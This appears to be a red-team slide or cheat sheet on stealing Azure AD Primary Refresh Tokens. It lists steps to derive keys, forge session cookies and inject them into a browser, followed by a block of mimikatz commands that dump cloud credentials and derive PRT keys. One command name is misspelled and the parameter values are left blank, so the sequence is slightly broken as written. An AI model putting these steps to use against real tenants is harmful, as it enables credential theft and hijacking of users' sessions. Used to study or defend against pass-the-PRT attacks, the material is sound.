
Abusing Azure AD PRT 
▪ Primary Refresh Token is the SSO artifact of Azure AD 
▪ The machine needs a corresponding device object in AAD 
▪ Protected by the TPM ▪ PRT can be used to request tokens (Refresh Token & Access Token) 
▪ Browser access is using cookies to handle sessions
1️⃣ Use the PRT to derive keys 
2️⃣ Generate your own cookies 
3️⃣ Inject your cookies in your browser 
4️⃣ Access the application

PRT and cookie manipulation with mimikatz

```powershell
 privilege::debug 
 sukurlsa::cloudap 
 token::elevate 
 dpapi::cloudapkd /keyvalue: /unprotect 
 dpapi::cloudapkd /prt: /derivedkey:
```
